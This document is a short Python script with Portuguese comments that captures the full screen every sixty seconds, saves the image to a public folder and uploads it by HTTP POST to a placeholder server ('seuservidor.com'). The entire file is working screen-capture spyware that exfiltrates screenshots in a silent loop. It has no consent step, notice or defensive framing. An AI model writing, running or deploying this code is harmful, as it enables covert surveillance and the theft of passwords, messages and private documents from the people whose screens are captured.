from PIL import ImageGrab
import requests
import time

screenshot_file = "C:\\Users\\Public\\screenshot.png"
server_url = "http://seuservidor.com/upload_screenshot"

def capture_and_send():
    while True:
        screenshot = ImageGrab.grab()
        screenshot.save(screenshot_file)

        # Envia o screenshot para o servidor
        with open(screenshot_file, "rb") as f:
            requests.post(server_url, files={"file": f})

        time.sleep(60)  # Tira uma captura de tela a cada 60 segundos

capture_and_send()
